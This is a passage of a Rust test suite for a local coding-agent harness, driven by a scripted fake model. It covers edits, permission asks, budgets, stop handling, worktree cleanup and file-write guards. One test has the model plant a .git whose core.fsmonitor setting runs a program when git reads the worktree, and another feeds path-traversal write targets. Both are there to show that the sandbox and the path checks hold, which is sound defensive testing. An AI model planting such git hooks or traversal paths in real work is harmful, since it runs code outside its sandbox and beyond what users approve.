    let made = r#"printf 'def plus(a, b):\n    return a + b\n' > helper.py"#;
    call(&fake, "bash", json!({"command": made}), false);
    edit(
        &fake,
        "return a - b",
        "from helper import plus\n\n    return plus(a, b)",
    );
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let p = &outcome.packet;
    assert_eq!(p.verdict, Verdict::Verified, "{}", p.render());
    let paths: Vec<&str> = p.scope.iter().map(|s| s.path.as_str()).collect();
    assert_eq!(paths, ["calc.py", "helper.py"], "{}", p.diff);
    assert!(p.diff.contains("+    return a + b\n"), "{}", p.diff);
}

#[test]
fn a_discarded_packet_removes_the_worktree_and_leaves_the_checkout_untouched() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let head = git(&repo, &["rev-parse", "HEAD"]);
    edit(&fake, "a - b", "a + b");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let worktree = outcome.task.worktree.clone().unwrap();
    assert!(worktree.exists());
    let mut out = Vec::new();
    let merged = decide(&mut outcome, &mut "maybe\ndiscard\n".as_bytes(), &mut out).unwrap();
    assert!(!merged);
    let shown = String::from_utf8(out).unwrap();
    assert!(shown.starts_with(&outcome.packet.render()), "{shown}");
    assert_eq!(shown.matches("approve or discard? ").count(), 2, "{shown}");
    assert!(!worktree.exists());
    assert_eq!(git(&repo, &["branch", "--list", "iris/*"]), "");
    assert_eq!(git(&repo, &["rev-parse", "HEAD"]), head);
    assert_eq!(git(&repo, &["status", "--porcelain"]), "");
    let calc = fs::read_to_string(repo.join("calc.py")).unwrap();
    assert_eq!(calc, "def add(a, b):\n    return a - b\n");
    let listed = git(&repo, &["worktree", "list", "--porcelain"]);
    assert_eq!(listed.matches("worktree ").count(), 1, "{listed}");
}

#[test]
fn every_reply_parses_with_the_retry_off_as_the_grammar_closes_the_calls() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    call(&fake, "view", json!({"path": "calc.py"}), false);
    edit(&fake, "a - b", "a + b");
    // Cut before its last brace, it is not JSON: only the grammar closes it, so it parses. The
    // step after it is unscripted, so the model says nothing, which is done.
    call(&fake, "run_tests", json!({}), true);
    let data = tmp.path().join("data");
    let Some(outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    assert_eq!((outcome.parsed, outcome.steps), (4, 4));
    assert_eq!(f64::from(outcome.parsed) / f64::from(outcome.steps), 1.0);
    assert_eq!(outcome.packet.commands_run, [TEST]);
    assert_eq!(counts(outcome.packet.tests_after.as_ref()), (1, 0));
    // Each model step has its audit line, with no parse error.
    let log = fs::read_dir(data.join("agent/log")).unwrap();
    let lines: Vec<AuditEvent> = (log.map(|f| fs::read_to_string(f.unwrap().path()).unwrap()))
        .flat_map(|text| {
            text.lines()
                .map(|l| serde_json::from_str(l).unwrap())
                .collect::<Vec<_>>()
        })
        .filter(|e: &AuditEvent| e.step.as_deref() == Some("attempt 0"))
        .collect();
    assert_eq!(lines.len(), 4, "{lines:?}");
    assert!(
        lines
            .iter()
            .all(|e| e.skill.as_deref() == Some("code") && e.error.is_none())
    );
}

#[test]
fn a_git_folder_the_model_plants_never_runs_outside_the_sandbox() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let (top, nested) = (tmp.path().join("top"), tmp.path().join("nested"));
    // The worktree's .git becomes a repository whose config runs a program when git reads the
    // worktree, and so does a repository inside it, which `git status` would look into.
    // On Windows the sandbox's shell is cmd.exe, whose del skips the hidden .git git makes there
    // unless /a, and git runs the fsmonitor in its own sh, which reads backslashes as escapes.
    let (rm, quote) = if cfg!(windows) {
        ("del /a .git", '"')
    } else {
        ("rm .git", '\'')
    };
    let sh_path = |p: &Path| p.display().to_string().replace('\\', "/");
    let plant = format!(
        "{rm} && git init -q . && git config core.fsmonitor {quote}touch {}; false{quote} && \
         mkdir sub && cd sub && git init -q && \
         git -c user.name=x -c user.email=x commit -q --allow-empty -m x && \
         git config core.fsmonitor {quote}touch {}; false{quote}",
        sh_path(&top),
        sh_path(&nested)
    );
    call(&fake, "bash", json!({"command": plant}), false);
    // The bash step spends the token budget, so the packet comes next.
    let budget = Budget { tokens: 1, ..k(1) };
    let data = tmp.path().join("data");
    let got = code().run(&fake.larch, &task(&repo, budget), &data);
    // Neither program ran, whether or not the run went through.
    assert!(!top.exists() && !nested.exists(), "{got:?}");
    let Some(mut outcome) = ran(got) else {
        return;
    };
    // Both were in place when git made the packet, and what the merge would bring in is what
    // the packet shows: the nested repository as the commit it adds.
    let worktree = outcome.task.worktree.clone().unwrap();
    assert!(worktree.join(".git").is_dir() && worktree.join("sub/.git").is_dir());
    let p = &outcome.packet;
    assert!(p.diff.contains("+Subproject commit "), "{}", p.diff);
    assert!(p.scope.iter().any(|s| s.path == "sub"), "{:?}", p.scope);
    assert!(!decide(&mut outcome, &mut "discard\n".as_bytes(), &mut Vec::new()).unwrap());
    assert!(!worktree.exists());
    let listed = git(&repo, &["worktree", "list", "--porcelain"]);
    assert_eq!(listed.matches("worktree ").count(), 1, "{listed}");
    assert!(!top.exists() && !nested.exists());
}

#[cfg(unix)]
#[test]
fn a_worktree_that_will_not_go_is_a_notice_and_the_picked_packet_stays() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    // Attempt 0 leaves a folder nothing can be removed from, then is over its budget; attempt 1
    // adds and is done.
    let stuck = "mkdir stuck && touch stuck/f && chmod 555 stuck";
    call(&fake, "bash", json!({"command": stuck}), false);
    edit(&fake, "a - b", "a + b");
    call(&fake, "run_tests", json!({}), false);
    fake.say("Done.");
    let budget = Budget {
        tool_calls: 1,
        ..k(2)
    };
    let data = tmp.path().join("data");
    let got = code().run(&fake.larch, &task(&repo, budget), &data);
    let left = data.join("agent/code/make-add-add/0/toy");
    let Some(outcome) = ran(got) else {
        return;
    };
    assert_eq!(outcome.task.branch.as_deref(), Some("iris/make-add-add-1"));
    // The picked attempt's words first, then the worktree that stayed.
    assert_eq!(outcome.notices.len(), 2, "{:?}", outcome.notices);
    assert_eq!(outcome.notices[0], "Done.");
    let notice = &outcome.notices[1];
    assert!(
        notice.contains(&format!("'{}' could not be removed", left.display())),
        "{notice}"
    );
    // So the temporary folder goes.
    use std::os::unix::fs::PermissionsExt;
    fs::set_permissions(left.join("stuck"), fs::Permissions::from_mode(0o755)).unwrap();
}

#[test]
fn a_reply_cut_at_its_token_cap_is_neither_done_nor_parsed() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    // Past the step's cap of 4096 tokens, the room of a whole file's write.
    fake.say_tokens(&vec![fake.byte(b'x'); 4200]);
    let budget = Budget { tokens: 1, ..k(1) };
    let data = tmp.path().join("data");
    let Some(outcome) = ran(code().run(&fake.larch, &task(&repo, budget), &data)) else {
        return;
    };
    assert_eq!((outcome.parsed, outcome.steps), (0, 1));
    let stopped = outcome.packet.stopped.as_deref();
    assert_eq!(stopped, Some("the tokens budget (1) ran out"));
    let log = fs::read_dir(data.join("agent/log")).unwrap();
    let text: String = log
        .map(|f| fs::read_to_string(f.unwrap().path()).unwrap())
        .collect();
    assert!(text.contains("cut at the token limit"), "{text}");
}

/// In place the toy itself changes, after a checkpoint branch saved it: a read and the test
/// command never ask; each other write the folder does not allow asks after its call shows, and
/// the answer decides and may widen what the folder allows, for later runs too; a no reaches the
/// model; undo puts the folder back, and the user's own branch never moved.
#[test]
fn in_place_asks_before_each_write_not_allowed_and_undo_puts_the_folder_back() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let data = tmp.path().join("data");
    call(&fake, "view", json!({"path": "calc.py"}), false);
    edit(&fake, "a - b", "a * b");
    edit(&fake, "a * b", "a + b");
    let note = |name: &str| json!({"path": format!("notes/{name}"), "about": "a note"});
    // New folders, but only inside: one that climbs out is refused before anyone is asked, and
    // before its text is written.
    for out in ["../made/x.txt", "notes/../../made/x.txt"] {
        call(
            &fake,
            "write_file",
            json!({"path": out, "about": "x"}),
            false,
        );
    }
    // Each note's text, written apart from its call.
    call(&fake, "write_file", note("no.txt"), false);
    fake.say("x");
    call(&fake, "bash", json!({"command": "echo hi"}), false);
    call(&fake, "write_file", note("yes.txt"), false);
    fake.say("x");
    call(&fake, "run_tests", json!({}), false);
    fake.say("Done: add adds.");
    let overrides = Overrides {
        test_cmd: Some(TEST.into()),
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("make add add", &repo, &data, overrides).unwrap();
    let answers = [Decision::File, Decision::No, Decision::All];
    let mut asked = Vec::new();
    let mut seen = Vec::new();
    let got = code().run_with(
        &fake.larch,
        &task,
        &data,
        &mut |e| seen.push(e),
        &mut |ask| {
            asked.push((ask.name.clone(), ask.path.clone()));
            answers[asked.len() - 1]
        },
    );
    let Some(mut outcome) = ran(got) else {
        return;
    };
    let file = |name: &str| Some(name.to_string());
    assert_eq!(
        asked,
        [
            ("edit".into(), file("calc.py")),
            ("write_file".into(), file("notes/no.txt")),
            ("bash".into(), None)
        ]
    );
    let calc = fs::read_to_string(repo.join("calc.py")).unwrap();
    assert_eq!(calc, "def add(a, b):\n    return a + b\n");
    assert!(!repo.join("notes/no.txt").exists());
    assert!(repo.join("notes/yes.txt").exists());
    assert!(!tmp.path().join("made").exists());
    let p = &outcome.packet;
    let done = "the model said it is done and the tests agree";
    assert_eq!(p.stopped.as_deref(), Some(done), "{}", p.render());
    assert!(p.diff.contains("+    return a + b\n"), "{}", p.diff);
    assert!(fake.fed().contains("the user said no to this call"));
    let noticed =
        |e: &AgentEvent| matches!(e, AgentEvent::Notice(t) if t.contains("larch/checkpoint-"));
    assert!(seen.iter().any(noticed), "{seen:?}");
    // Kept for the next run: the file, and everything since the user said so.
    let allowed = allow::load(&data, &outcome.task.repo).unwrap();
    assert!(
        allowed.silent && allowed.files.contains("calc.py"),
        "{allowed:?}"
    );
    // The user's own branch and index never moved; the checkpoint is a branch of its own.
    assert_eq!(git(&repo, &["log", "--format=%s"]), "start\n");
    assert_eq!(git(&repo, &["diff", "--cached", "--name-only"]), "");
    let branch = (outcome.task.folder.as_ref())
        .and_then(|f| f.branch.clone())
        .unwrap();
    assert!(git(&repo, &["branch", "--list"]).contains(&branch));
    // Undo: the folder as the checkpoint has it.
    let mut out = Vec::new();
    assert!(!decide(&mut outcome, &mut "y\n".as_bytes(), &mut out).unwrap());
    let calc = fs::read_to_string(repo.join("calc.py")).unwrap();
    assert_eq!(calc, "def add(a, b):\n    return a - b\n");
    assert_eq!(git(&repo, &["status", "--porcelain"]), "");
}

/// The folder's allowances are read at each write, not once per run: the menu set to allow
/// everything while the run waits on an ask lets the next edit run unasked, and set back to ask
/// after it makes the edit after that ask again.
#[test]
fn a_menu_change_mid_run_applies_to_the_next_write() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let data = tmp.path().join("data");
    edit(&fake, "a - b", "a * b");
    edit(&fake, "a * b", "a // b");
    edit(&fake, "a // b", "a + b");
    call(&fake, "run_tests", json!({}), false);
    fake.say("Done: add adds.");
    let overrides = Overrides {
        test_cmd: Some(TEST.into()),
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("make add add", &repo, &data, overrides).unwrap();
    let every = allow::Allowed {
        silent: true,
        ..Default::default()
    };
    let mut asked = 0;
    let mut edited = 0;
    let got = code().run_with(
        &fake.larch,
        &task,
        &data,
        &mut |e| {
            if matches!(&e, AgentEvent::ToolResult { name, .. } if name == "edit") {
                edited += 1;
                if edited == 2 {
                    allow::save(&data, &task.repo, &Default::default()).unwrap();
                }
            }
        },
        &mut |_| {
            asked += 1;
            allow::save(&data, &task.repo, &every).unwrap();
            Decision::Once
        },
    );
    let Some(_) = ran(got) else {
        return;
    };
    assert_eq!((asked, edited), (2, 3));
    let calc = fs::read_to_string(repo.join("calc.py")).unwrap();
    assert_eq!(calc, "def add(a, b):\n    return a + b\n");
}

/// A new program in an empty folder git does not track and no test command names: run_tests is
/// not offered; each write_file names its file and what it holds, and its text is written apart
/// as a plain answer to a brief (the request, the files so far, a stylesheet told every class the
/// pages use), its fence and wrapping tags taken off; each new file asks first. A done gets the
/// files back to check (a page that links a file not there, one that is a fragment, a class no
/// stylesheet styles); while a page is broken the next reply is held to a call, and the done
/// after the fix ends the run once the reviewer agrees, the unstyled class only advice. Undo
/// leaves the folder empty again; no repository is ever made in it.
#[test]
fn in_place_without_tests_writes_a_new_program_and_its_word_ends_the_run() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("new");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    fake.say("Done.");
    let write = |path: &str, about: &str| json!({"path": path, "about": about});
    let program = "print(\"hi\")\n";
    call(&fake, "write_file", write("hi.py", "says hi"), false);
    fake.say(&format!("```python\n{program}```"));
    let page = format!(
        "<body class=\"hero dark\" id=\"menu\"><link href=\"styles.css\"><a href=\"#menu\">{}</a></body>\n",
        "x".repeat(500)
    );
    call(
        &fake,
        "write_file",
        write("web/index.html", "the page"),
        false,
    );
    fake.say(&page);
    call(&fake, "write_file", write("web/part.html", "a part"), false);
    fake.say("<h1>Menu</h1>");
    call(
        &fake,
        "write_file",
        write("web/style.css", "the look"),
        false,
    );
    fake.say("<style>\n.dark { color: #222; }\n</style>");
    fake.say("Done.");
    // Held to a call, then free to say done after a command; a done while a page is still
    // broken is checked again and held to a call, here the fixes of the link and the fragment,
    // and the done after them ends it.
    call(&fake, "bash", json!({"command": "ls web"}), false);
    fake.say("Done.");
    call(
        &fake,
        "write_file",
        write("web/styles.css", "the page's look"),
        false,
    );
    fake.say("body { margin: 0; }");
    call(
        &fake,
        "write_file",
        write("web/part.html", "a whole page"),
        false,
    );
    fake.say("<body><h1>Menu</h1></body>");
    fake.say("Done: hi.py says hi.");
    // The reviewer reads the done no broken page holds back.
    fake.say("ok");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder(
        "write a program that says hi and a web page",
        &folder,
        &data,
        overrides,
    );
    let task = task.unwrap();
    assert_eq!(task.test_cmd, None);
    let mut asked = Vec::new();
    let mut outcome = (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |ask| {
        asked.push(ask.path.clone());
        Decision::Once
    }))
    .unwrap();
    let asked: Vec<_> = asked.into_iter().flatten().collect();
    let files = [
        "hi.py",
        "web/index.html",
        "web/part.html",
        "web/style.css",
        "web/styles.css",
        "web/part.html",
    ];
    assert_eq!(asked, files);
    assert_eq!(fs::read_to_string(folder.join("hi.py")).unwrap(), program);
    let css = fs::read_to_string(folder.join("web/style.css")).unwrap();
    assert_eq!(css, ".dark { color: #222; }\n");
    let part = fs::read_to_string(folder.join("web/part.html")).unwrap();
    assert_eq!(part, "<body><h1>Menu</h1></body>\n");
    let fed = fake.fed();
    assert!(!fed.contains("run_tests"), "{fed}");
    assert!(fed.contains("nothing has changed yet"), "{fed}");
    for said in [
        "Request: write a program that says hi and a web page",
        "Write web/index.html whole: the page",
        "The pages use the classes dark, hero and the ids menu; web/style.css must cover every one",
        "check your work against the request",
        "hi.py: 1 lines, 12 bytes",
        "web/index.html links styles.css, which does not exist: write it with write_file web/styles.css",
        "web/part.html has no <body>: it is a fragment, not a whole page",
        "web/index.html uses the classes hero, which no stylesheet styles",
        "no stylesheet has an @media rule: the layout does not change for a phone",
        "each file whole: a page is broken",
    ] {
        assert!(fed.contains(said), "{said}: {fed}");
    }
    // The anchor is no file. The briefs after the page carry it whole, so the files written
    // after it fit it.
    assert!(!fed.contains("links #menu"), "{fed}");
    assert!(fed.contains("web/index.html:\n<body class="), "{fed}");
    let p = &outcome.packet;
    let done = "the model said it is done; the folder has no tests";
    assert_eq!(p.stopped.as_deref(), Some(done), "{}", p.render());
    assert_eq!((&p.tests_before, &p.tests_after), (&None, &None));
    assert!(p.diff.contains("+print(\"hi\")"), "{}", p.diff);
    assert!(!folder.join(".git").exists());
    let mut out = Vec::new();
    assert!(!decide(&mut outcome, &mut "y\n".as_bytes(), &mut out).unwrap());
    assert_eq!(fs::read_dir(&folder).unwrap().count(), 0);
}

/// An attempt without tests that stops before a done its pages pass, here at its tool_calls
/// budget, says in its stop what still breaks them: the user and the chat hear it with the packet.
#[test]
fn an_untested_attempt_that_stops_says_what_still_breaks_its_page() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("game");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    let write = |path: &str, about: &str| json!({"path": path, "about": about});
    call(&fake, "write_file", write("index.html", "the board"), false);
    fake.say("<body><div id=\"board\"></div><script src=\"game.js\"></script></body>");
    call(&fake, "write_file", write("game.js", "the game"), false);
    fake.say("function init() {\n  document.getElementById('board');\n}\n");
    // The plan, the two writes and a command are the budget's; the command after it stops the
    // run.
    for _ in 0..2 {
        call(&fake, "bash", json!({"command": "true"}), false);
    }
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: Budget {
            tool_calls: 4,
            ..k(1)
        },
    };
    let task = CodeTask::in_folder("make a game", &folder, &data, overrides).unwrap();
    let outcome = (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    assert_eq!(
        outcome.packet.stopped.as_deref(),
        Some(
            "the tool_calls budget (4) ran out; a page is still broken: the \
             scripts of index.html only define functions (init) and call none of them, so \
             nothing runs and the page stays as its HTML draws it: call the one that starts it \
             at the end of game.js, such as init();"
        )
    );
}

/// Stop ends a run at its next safe point: the write under way when it is pressed runs to its end,
/// whole, the reply after it is never asked for, and the packet says the user stopped it.
#[test]
fn a_stop_ends_the_run_after_the_call_under_way() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("site");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    let write = |path: &str, about: &str| json!({"path": path, "about": about});
    call(&fake, "write_file", write("index.html", "the page"), false);
    fake.say("<body>Open 7-5</body>");
    call(&fake, "write_file", write("style.css", "the look"), false);
    fake.say("body { margin: 0; }");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("make a page", &folder, &data, overrides).unwrap();
    let stop = Arc::new(AtomicBool::new(false));
    // Pressed as the page is written: its result is the write's end.
    let mut sink = |e: AgentEvent| {
        if matches!(e, AgentEvent::ToolResult { name, .. } if name == "write_file") {
            stop.store(true, Ordering::Relaxed);
        }
    };
    let outcome = code().run_until(
        &fake.larch,
        &task,
        &data,
        &mut sink,
        &mut |_| Decision::Once,
        &stop,
    );
    let outcome = outcome.unwrap();
    let stopped = outcome.packet.stopped.as_deref();
    assert_eq!(stopped, Some("the user stopped the run"));
    let page = fs::read_to_string(folder.join("index.html")).unwrap();
    assert_eq!(page, "<body>Open 7-5</body>\n");
    assert!(!folder.join("style.css").exists());
    assert!(fake.unsaid() > 0);
}

/// Stop pressed while the writer's generation crawls, one forward pass taking seconds as on a
/// machine that swaps, ends the run at once instead of after that pass, and writes no file.
#[test]
fn a_stop_during_a_slow_generation_ends_the_run_at_once_and_writes_nothing() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("site");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    let write = json!({"path": "index.html", "about": "the page"});
    call(&fake, "write_file", write, false);
    fake.say("<body>Open 7-5</body>");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("make a page", &folder, &data, overrides).unwrap();
    let (stop, armed) = (Arc::new(AtomicBool::new(false)), AtomicBool::new(false));
    let pressed = std::sync::Mutex::new(None);
    // The writer's first pass stalls; Stop is pressed while it runs.
    let mut sink = |e: AgentEvent| {
        if matches!(e, AgentEvent::ToolCall { name, .. } if name == "write_file") {
            fake.stall(Duration::from_secs(8));
            armed.store(true, Ordering::Relaxed);
        }
    };
    let outcome = std::thread::scope(|s| {
        s.spawn(|| {
            while !armed.load(Ordering::Relaxed) {
                std::thread::sleep(Duration::from_millis(1));
            }
            fake.wait_stalled();
            // The writer's reader must be waiting on the engine when Stop comes: a stream
            // cancelled before its first read ends at once without the engine, and its reader
            // with it. The pass holds for seconds; its reader starts in microseconds.
            std::thread::sleep(Duration::from_millis(500));
            *pressed.lock().unwrap() = Some(Instant::now());
            stop.store(true, Ordering::Relaxed);
        });
        code().run_until(
            &fake.larch,
            &task,
            &data,
            &mut sink,
            &mut |_| Decision::Once,
            &stop,
        )
    });
    let took = pressed.lock().unwrap().unwrap().elapsed();
    assert!(took < Duration::from_secs(4), "{took:?}");
    let stopped = outcome.unwrap().packet.stopped;
    assert_eq!(stopped.as_deref(), Some("the user stopped the run"));
    assert!(!folder.join("index.html").exists());
    // The stopped reader holds the engine until its pass ends: an unload waits for it.
    assert!(!workers::wait_stopped(Duration::ZERO));
    assert!(workers::wait_stopped(Duration::from_secs(30)));
}

/// A run stopped in a folder with tests runs no tests after it: the same Stop would kill them at
/// once, and a killed run reads as one failure, which the packet and the chat would report.
#[test]
fn a_stopped_run_reports_no_tests_after_it() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let data = tmp.path().join("data");
    edit(&fake, "a - b", "a + b");
    fake.say("Done.");
    let overrides = Overrides {
        test_cmd: Some(TEST.into()),
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("make add add", &repo, &data, overrides).unwrap();
    let stop = Arc::new(AtomicBool::new(false));
    let mut sink = |e: AgentEvent| {
        if matches!(e, AgentEvent::ToolResult { .. }) {
            stop.store(true, Ordering::Relaxed);
        }
    };
    let outcome = code().run_until(
        &fake.larch,
        &task,
        &data,
        &mut sink,
        &mut |_| Decision::Once,
        &stop,
    );
    let Some(outcome) = ran(outcome) else {
        return;
    };
    let stopped = outcome.packet.stopped.as_deref();
    assert_eq!(stopped, Some("the user stopped the run"));
    assert!(outcome.packet.tests_before.is_some());
    assert!(
        outcome.packet.tests_after.is_none(),
        "{:?}",
        outcome.packet.tests_after
    );
}

/// A whole write that would cut a file to a fraction of it, the few lines a small model means to
/// add, is refused before anyone is asked, and the file stays; one about its size runs.
#[test]
fn a_whole_write_never_cuts_a_file_to_a_fragment() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("site");
    fs::create_dir(&folder).unwrap();
    let page = format!("<body>{}</body>\n", "p".repeat(400));
    fs::write(folder.join("index.html"), &page).unwrap();
    let data = tmp.path().join("data");
    let write = json!({"path": "index.html", "about": "the page with the hours"});
    call(&fake, "write_file", write, false);
    fake.say("<header>Menu</header>");
    let longer = page.replace("</body>", "<footer>Open 7-5</footer></body>");
    // Another about: the same brief gets the same text again, unwritten (`Attempt::body`).
    let whole = json!({"path": "index.html", "about": "the whole page, the hours in its footer"});
    call(&fake, "write_file", whole, false);
    fake.say(&longer);
    fake.say("Done.");
    fake.say("Done.");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("add hours", &folder, &data, overrides).unwrap();
    let mut asked = 0;
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        asked += 1;
        Decision::Once
    }))
    .unwrap();
    assert_eq!(asked, 1);
    assert!(fake.fed().contains("deleting most of it"), "{}", fake.fed());
    assert_eq!(
        fs::read_to_string(folder.join("index.html")).unwrap(),
        longer
    );
}

/// A writer that copies the file it was shown changes nothing: the write is refused as such,
/// unasked; the same call again in the folder it left is not run, and a third asks for the
/// answer, which the next reply's words are.
#[test]
fn a_whole_write_that_changes_nothing_is_refused_and_answered_again_from_the_same_text() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("site");
    fs::create_dir(&folder).unwrap();
    let page = "<body style=\"color: white\">Open 7-5</body>\n";
    fs::write(folder.join("index.html"), page).unwrap();
    let data = tmp.path().join("data");
    let write = json!({"path": "index.html", "about": "the page with black text"});
    call(&fake, "write_file", write.clone(), false);
    // The writer's one text: a second ask for it would take the next call as the page.
    fake.say(page);
    // The user's run: the same write twice more, one step after another.
    for _ in 0..2 {
        call(&fake, "write_file", write.clone(), false);
    }
    fake.say("The text was black already.");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: Budget {
            tool_calls: 4,
            ..k(1)
        },
    };
    let task = CodeTask::in_folder("make the text black", &folder, &data, overrides).unwrap();
    let mut asked = 0;
    let outcome = (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        asked += 1;
        Decision::Once
    }))
    .unwrap();
    assert_eq!(asked, 0, "{}", fake.fed());
    assert!(
        fake.fed().contains("the write would change nothing"),
        "{}",
        fake.fed()
    );
    assert!(fake.fed().contains("not run: step 1 made this same call"));
    let why = "the model made the same call 3 times with the folder unchanged; ended with the \
               model's answer";
    assert_eq!(outcome.packet.stopped.as_deref(), Some(why));
    assert_eq!(outcome.packet.pr_body, "The text was black already.");
    assert_eq!(fake.unsaid(), 0);
    assert_eq!(fs::read_to_string(folder.join("index.html")).unwrap(), page);
}

/// A large repository's file names fill no writer's context: the brief lists them as far as its
/// bound goes and says how many more there are, and the file is still written.
#[test]
fn a_brief_lists_a_large_repositorys_files_only_as_far_as_its_bound() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("big");
    fs::create_dir_all(folder.join("pkg")).unwrap();
    for i in 0..300 {
        fs::write(
            folder.join(format!("pkg/a_long_module_name_{i:04}.txt")),
            "x",
        )
        .unwrap();
    }
    let data = tmp.path().join("data");
    call(
        &fake,
        "write_file",
        json!({"path": "notes.txt", "about": "a note"}),
        false,
    );
    fake.say("a note\n");
    fake.say("Done.");
    fake.say("Done.");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("add a note", &folder, &data, overrides).unwrap();
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    let fed = fake.fed();
    assert!(fed.contains("pkg/a_long_module_name_0000.txt"), "{fed}");
    assert!(!fed.contains("pkg/a_long_module_name_0299.txt"), "{fed}");
    assert!(fed.contains(" more\n"), "{fed}");
    assert_eq!(
        fs::read_to_string(folder.join("notes.txt")).unwrap(),
        "a note\n"
    );
}

/// A file too long for the brief to show is never rewritten whole by a writer that cannot see
/// it: the write gets no text, is refused before anyone is asked, and the file stays.
#[test]
fn a_file_too_long_to_show_the_writer_is_never_rewritten_unseen() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("app");
    fs::create_dir(&folder).unwrap();
    // Past the 32 KB brief a 32k context gives (`Room::brief_bytes`), in fewer lines than the
    // room rewrites whole (`Room::rewrite_max_lines`), which would refuse it first.
    let script = format!("let x = '{}';\n", "x".repeat(88)).repeat(400);
    fs::write(folder.join("app.js"), &script).unwrap();
    let data = tmp.path().join("data");
    let write = json!({"path": "app.js", "about": "the app with a menu toggle"});
    call(&fake, "write_file", write, false);
    fake.say("Done.");
    fake.say("Done.");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("add a menu toggle", &folder, &data, overrides).unwrap();
    let mut asked = 0;
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        asked += 1;
        Decision::Once
    }))
    .unwrap();
    assert_eq!(asked, 0);
    let fed = fake.fed();
    assert!(!fed.contains("Write app.js whole"), "{fed}");
    assert!(fed.contains("deleting most of it"), "{fed}");
    assert_eq!(fs::read_to_string(folder.join("app.js")).unwrap(), script);
}

/// A question gets its answer: a done with nothing changed is told so once, without holding the
/// next reply to a call, and the done after it ends the run with its words, which the user is
/// shown; the packet changes no file.
#[test]
fn a_question_is_answered_and_nothing_changes() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("prog");
    fs::create_dir(&folder).unwrap();
    fs::write(folder.join("main.py"), "print('hi')\n").unwrap();
    let data = tmp.path().join("data");
    call(&fake, "view", json!({"path": "main.py"}), false);
    fake.say("It prints once, so it runs in about 235 ms.");
    fake.say("It runs in about 235 ms; nothing needs a change.");
    let task = untested("how's the performance?", &folder, &data);
    let outcome = (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    let p = &outcome.packet;
    assert!(p.scope.is_empty() && p.diff.is_empty(), "{}", p.diff);
    let words = "It runs in about 235 ms; nothing needs a change.";
    assert_eq!(p.pr_body, words);
    let done = "the model said it is done; nothing changed";
    assert_eq!(p.stopped.as_deref(), Some(done));
